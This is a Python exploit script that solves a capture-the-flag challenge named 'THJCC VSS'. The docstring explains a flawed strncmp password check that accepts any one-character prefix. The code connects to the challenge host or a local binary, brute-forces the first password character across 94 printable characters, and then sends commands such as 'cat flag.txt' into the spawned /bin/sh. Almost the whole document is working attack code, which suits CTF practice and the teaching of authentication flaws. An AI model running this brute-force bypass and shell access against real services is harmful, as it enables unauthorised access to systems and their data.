#!/usr/bin/env python3
"""
Solver for THJCC VSS.

Bug:
  Password is 16 random printable chars, but the check is:
      strncmp(user_input, password, strlen(user_input))
  So a one-character prefix is enough. The service loops on wrong guesses,
  and the password stays the same during the same connection. Try all 94
  non-space printable characters until the first character matches, then use
  the spawned /bin/sh to read the flag.
"""
import argparse
import os
import select
import socket
import subprocess
import sys
import time
from typing import Optional

HOST = "chal.thjcc.org"
PORT = 11039

# Exact alphabet used by the binary: ASCII printable except space.
ALPHABET = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~'


class RemoteTube:
    def __init__(self, host: str, port: int, timeout: float = 10.0):
        self.sock = socket.create_connection((host, port), timeout=timeout)
        self.sock.setblocking(False)

    def send(self, data: bytes) -> None:
        self.sock.sendall(data)

    def recv_some(self) -> bytes:
        try:
            return self.sock.recv(65536)
        except BlockingIOError:
            return b""

    def close(self) -> None:
        try:
            self.sock.close()
        except Exception:
            pass


class LocalTube:
    def __init__(self, binary: str):
        self.proc = subprocess.Popen(
            [binary],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            cwd=os.path.dirname(os.path.abspath(binary)) or ".",
        )

    def send(self, data: bytes) -> None:
        assert self.proc.stdin is not None
        self.proc.stdin.write(data)
        self.proc.stdin.flush()

    def recv_some(self) -> bytes:
        assert self.proc.stdout is not None
        fd = self.proc.stdout.fileno()
        r, _, _ = select.select([fd], [], [], 0)
        if not r:
            return b""
        try:
            return os.read(fd, 65536)
        except OSError:
            return b""

    def close(self) -> None:
        try:
            self.proc.kill()
        except Exception:
            pass


def recv_for(tube, seconds: float) -> bytes:
    data = b""
    end = time.time() + seconds
    while time.time() < end:
        chunk = tube.recv_some()
        if chunk:
            data += chunk
            # extend a little so split TCP packets are collected
            end = max(end, time.time() + 0.05)
        else:
            time.sleep(0.01)
    return data


def recv_until(tube, needle: bytes, timeout: float = 5.0) -> bytes:
    data = b""
    end = time.time() + timeout
    while time.time() < end:
        chunk = tube.recv_some()
        if chunk:
            data += chunk
            if needle in data:
                return data
        else:
            time.sleep(0.01)
    return data


def solve(tube, command: str) -> bytes:
    banner = recv_until(tube, b"password:", timeout=5.0)
    sys.stderr.write(banner.decode("latin1", errors="replace"))

    hit: Optional[str] = None

    for ch in ALPHABET:
        sys.stderr.write(f"[*] trying prefix {ch!r}\n")
        tube.send(ch.encode() + b"\n")
        out = recv_for(tube, 0.20)

        if b"right password" in out:
            hit = ch
            sys.stderr.write(out.decode("latin1", errors="replace"))
            break

        # Normal wrong response loops back to the same password prompt.
        if b"Wrong password" not in out and out:
            sys.stderr.write(out.decode("latin1", errors="replace"))

    if hit is None:
        raise RuntimeError("failed to find one-byte prefix; service behavior changed?")

    sys.stderr.write(f"[+] matched first password character: {hit!r}\n")

    if not command.endswith("\n"):
        command += "\n"

    # system('/bin/sh') is running now. Send command to the shell.
    tube.send(command.encode())
    return recv_for(tube, 2.0)


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default=HOST)
    ap.add_argument("--port", default=PORT, type=int)
    ap.add_argument("--local", action="store_true")
    ap.add_argument("--binary", default="./chal")
    ap.add_argument("--cmd", default="cat flag.txt; cat /flag 2>/dev/null")
    args = ap.parse_args()

    tube = LocalTube(args.binary) if args.local else RemoteTube(args.host, args.port)
    try:
        out = solve(tube, args.cmd)
        print(out.decode("latin1", errors="replace"), end="")
    finally:
        tube.close()


if __name__ == "__main__":
    main()
